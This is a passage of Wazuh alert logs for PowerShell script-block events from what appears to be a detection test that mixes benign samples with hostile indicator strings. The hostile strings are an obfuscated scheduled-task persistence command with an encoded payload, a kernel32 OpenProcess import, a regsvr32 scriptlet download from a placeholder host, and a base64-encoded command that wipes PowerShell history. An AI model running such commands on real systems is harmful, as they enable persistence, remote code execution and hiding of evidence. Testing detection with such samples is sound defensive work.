''pOwe`rsHELl.exe'' -','ARg`uMeNT ''-nO`PrOFILE ','-enCOdeD`CO`mManD vWB','`YaGK`aDABlAC0atWB1','AHQa`CaB1AHQAiAa','naFqaSAbFaf`mA`SqBTAc0aS','qBoa`EuAuGbuaC`cA''',')'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: a5895818-95ba-4d72-95e8-9a193d1f5c30\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:27.3171755Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:27.3171755Z\",\"eventRecordID\":\"723565\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-245'; $parts=@('regIsT`ER-SChEdu','LEDTaSK -ta`SKNAme ''','UPDaTECHeCk'' -act`I','oN (NEw-scHedUleDTaSKa','C`T`IOn -eX`eCuTe',' ''pOwe`rsHELl.exe'' -','ARg`uMeNT ''-nO`PrOFILE ','-enCOdeD`CO`mManD vWB','`YaGK`aDABlAC0atWB1','AHQa`CaB1AHQAiAa','naFqaSAbFaf`mA`SqBTAc0aS','qBoa`EuAuGbuaC`cA''',')'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: a5895818-95ba-4d72-95e8-9a193d1f5c30\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-245'; $parts=@('regIsT`ER-SChEdu','LEDTaSK -ta`SKNAme ''','UPDaTECHeCk'' -act`I','oN (NEw-scHedUleDTaSKa','C`T`IOn -eX`eCuTe',' ''pOwe`rsHELl.exe'' -','ARg`uMeNT ''-nO`PrOFILE ','-enCOdeD`CO`mManD vWB','`YaGK`aDABlAC0atWB1','AHQa`CaB1AHQAiAa','naFqaSAbFaf`mA`SqBTAc0aS','qBoa`EuAuGbuaC`cA''',')'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"a5895818-95ba-4d72-95e8-9a193d1f5c30\"}}}","id":"1784281048.569556","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:28.171+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"f3a9bc31-6cb3-487c-b252-72a55d8499a1","scriptBlockText":"$sampleId='PST-246'; Get-Command Get-Process | Select-Object Name, CommandType, Source; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723567","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-246'; Get-Command Get-Process | Select-Object Name, CommandType, Source; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: f3a9bc31-6cb3-487c-b252-72a55d8499a1\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:27.6658078Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:27.6658078Z\",\"eventRecordID\":\"723567\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-246'; Get-Command Get-Process | Select-Object Name, CommandType, Source; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: f3a9bc31-6cb3-487c-b252-72a55d8499a1\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-246'; Get-Command Get-Process | Select-Object Name, CommandType, Source; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"f3a9bc31-6cb3-487c-b252-72a55d8499a1\"}}}","id":"1784281048.569556","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell executing process discovery","firedtimes":11,"groups":["windows"," powershell"],"id":"91815","level":4,"mail":false,"mitre":{"id":["T1057"],"tactic":["Discovery"],"technique":["Process Discovery"]}},"timestamp":"2026-07-17T11:37:28.175+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"dbce3401-72c6-45dd-bafe-830b4347b64a","scriptBlockText":"$sampleId='PST-247'; $parts=@('Add-tYPE -MeMbe`Rd','`EFINiTion ''[DLLim`','PorT(\\\"keRNeL32','.DlL\\\")] puBl','IC STa`tIc EXtERN',' in`TptR OpENprO','C`esS(uINT aCcE','sS, bool InhEr`it, ','Int pr`OCesSi','d);'' -nAme NAt`i','VemEt`hods -NA`','mEsPACE ThESIs.inEr','t'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723572","keywords":"0x0","level":"3","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-247'; $parts=@('Add-tYPE -MeMbe`Rd','`EFINiTion ''[DLLim`','PorT(\"keRNeL32','.DlL\")] puBl','IC STa`tIc EXtERN',' in`TptR OpENprO','C`esS(uINT aCcE','sS, bool InhEr`it, ','Int pr`OCesSi','d);'' -nAme NAt`i','VemEt`hods -NA`','mEsPACE ThESIs.inEr','t'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: dbce3401-72c6-45dd-bafe-830b4347b64a\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"WARNING","systemTime":"2026-07-17T09:37:27.9963770Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"3\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:27.9963770Z\",\"eventRecordID\":\"723572\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"WARNING\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-247'; $parts=@('Add-tYPE -MeMbe`Rd','`EFINiTion ''[DLLim`','PorT(\\\"keRNeL32','.DlL\\\")] puBl','IC STa`tIc EXtERN',' in`TptR OpENprO','C`esS(uINT aCcE','sS, bool InhEr`it, ','Int pr`OCesSi','d);'' -nAme NAt`i','VemEt`hods -NA`','mEsPACE ThESIs.inEr','t'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: dbce3401-72c6-45dd-bafe-830b4347b64a\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-247'; $parts=@('Add-tYPE -MeMbe`Rd','`EFINiTion ''[DLLim`','PorT(\\\\\\\"keRNeL32','.DlL\\\\\\\")] puBl','IC STa`tIc EXtERN',' in`TptR OpENprO','C`esS(uINT aCcE','sS, bool InhEr`it, ','Int pr`OCesSi','d);'' -nAme NAt`i','VemEt`hods -NA`','mEsPACE ThESIs.inEr','t'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"dbce3401-72c6-45dd-bafe-830b4347b64a\"}}}","id":"1784281048.572203","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:28.227+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"7306863d-e4ca-42c8-88b0-dbb0ce7e632b","scriptBlockText":"$sampleId='PST-248'; $indicator='GeT-PRoCESs | selEcT-oBjECt nAme,Id,pATH'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723574","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-248'; $indicator='GeT-PRoCESs | selEcT-oBjECt nAme,Id,pATH'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 7306863d-e4ca-42c8-88b0-dbb0ce7e632b\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:28.3245177Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:28.3245177Z\",\"eventRecordID\":\"723574\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-248'; $indicator='GeT-PRoCESs | selEcT-oBjECt nAme,Id,pATH'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 7306863d-e4ca-42c8-88b0-dbb0ce7e632b\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-248'; $indicator='GeT-PRoCESs | selEcT-oBjECt nAme,Id,pATH'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"7306863d-e4ca-42c8-88b0-dbb0ce7e632b\"}}}","id":"1784281049.574514","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell executing process discovery","firedtimes":12,"groups":["windows"," powershell"],"id":"91815","level":4,"mail":false,"mitre":{"id":["T1057"],"tactic":["Discovery"],"technique":["Process Discovery"]}},"timestamp":"2026-07-17T11:37:29.080+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"2b512f82-2ddf-4216-ac4d-da861e15268b","scriptBlockText":"$sampleId='PST-249'; Get-NetIPConfiguration | Select-Object -First 3 InterfaceAlias, IPv4Address; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723576","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-249'; Get-NetIPConfiguration | Select-Object -First 3 InterfaceAlias, IPv4Address; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 2b512f82-2ddf-4216-ac4d-da861e15268b\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:28.6659155Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:28.6659155Z\",\"eventRecordID\":\"723576\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-249'; Get-NetIPConfiguration | Select-Object -First 3 InterfaceAlias, IPv4Address; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 2b512f82-2ddf-4216-ac4d-da861e15268b\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-249'; Get-NetIPConfiguration | Select-Object -First 3 InterfaceAlias, IPv4Address; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"2b512f82-2ddf-4216-ac4d-da861e15268b\"}}}","id":"1784281049.574514","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:29.085+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"0f5dccd9-3683-4050-81e4-24bed357738f","scriptBlockText":"$sampleId='PST-250'; $indicator='regsvr32.exe /s /n /u /i:https://reg.example.invalid/a.sct scrobj.dll'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723595","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-250'; $indicator='regsvr32.exe /s /n /u /i:https://reg.example.invalid/a.sct scrobj.dll'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 0f5dccd9-3683-4050-81e4-24bed357738f\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:29.6154019Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:29.6154019Z\",\"eventRecordID\":\"723595\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-250'; $indicator='regsvr32.exe /s /n /u /i:https://reg.example.invalid/a.sct scrobj.dll'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 0f5dccd9-3683-4050-81e4-24bed357738f\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-250'; $indicator='regsvr32.exe /s /n /u /i:https://reg.example.invalid/a.sct scrobj.dll'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"0f5dccd9-3683-4050-81e4-24bed357738f\"}}}","id":"1784281050.574514","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:30.530+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"cdce393f-0cc0-4412-83cf-310da9ddf7fb","scriptBlockText":"$sampleId='PST-251'; $encoded='QwBsAGUAYQByAC0ASABpAHMAdABvAHIAeQA7ACAAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAAKABHAGUAdAAtAFAAUwBSAGUAYQBkAEwAaQBuAGUATwBwAHQAaQBvAG4AKQAuAEgAaQBzAHQAbwByAHkAUwBhAHYAZQBQAGEAdABoACAALQBGAG8AcgBjAGUA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723599","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-251'; $encoded='QwBsAGUAYQByAC0ASABpAHMAdABvAHIAeQA7ACAAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAAKABHAGUAdAAtAFAAUwBSAGUAYQBkAEwAaQBuAGUATwBwAHQAaQBvAG4AKQAuAEgAaQBzAHQAbwByAHkAUwBhAHYAZQBQAGEAdABoACAALQBGAG8AcgBjAGUA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: cdce393f-0cc0-4412-83cf-310da9ddf7fb\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:29.9675020Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:29.9675020Z\",\"eventRecordID\":\"723599\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-251'; $encoded='QwBsAGUAYQByAC0ASABpAHMAdABvAHIAeQA7ACAAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAAKABHAGUAdAAtAFAAUwBSAGUAYQBkAEwAaQBuAGUATwBwAHQAaQBvAG4AKQAuAEgAaQBzAHQAbwByAHkAUwBhAHYAZQBQAGEAdABoACAALQBGAG8AcgBjAGUA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: cdce393f-0cc0-4412-83cf-310da9ddf7fb\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-251'; $encoded='QwBsAGUAYQByAC0ASABpAHMAdABvAHIAeQA7ACAAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAAKABHAGUAdAAtAFAAUwBSAGUAYQBkAEwAaQBuAGUATwBwAHQAaQBvAG4AKQAuAEgAaQBzAHQAbwByAHkAUwBhAHYAZQBQAGEAdABoACAALQBGAG8AcgBjAGUA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"cdce393f-0cc0-4412-83cf-310da9ddf7fb\"}}}","id":"1784281050.576745","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script may be using Base64 decoding method","firedtimes":23,"groups":["windows"," powershell"],"id":"91809","level":10,"mail":false,"mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]}},"timestamp":"2026-07-17T11:37:30.577+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"169c867d-217d-41dd-a755-71bd05ef1aa8","scriptBlockText":"$sampleId='PST-252'; $b = 'aW52ZW50b3J5LW5vdGU='; [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)); Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723602","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-252'; $b = 'aW52ZW50b3J5LW5vdGU='; [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)); Write-Output 'hard benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 169c867d-217d-41dd-a755-71bd05ef1aa8\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:30.2890917Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:30.2890917Z\",\"eventRecordID\":\"723602\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-252'; $b = 'aW52ZW50b3J5LW5vdGU='; [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)); Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 169c867d-217d-41dd-a755-71bd05ef1aa8\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-252'; $b = 'aW52ZW50b3J5LW5vdGU='; [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)); Write-Output 'hard benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"169c867d-217d-41dd-a755-71bd05ef1aa8\"}}}","id":"1784281050.579936","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script may be using Base64 decoding method","firedtimes":24,"groups":["windows"," powershell"],"id":"91809","level":10,"mail":false,"mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]}},"timestamp":"2026-07-17T11:37:30.622+0200"}
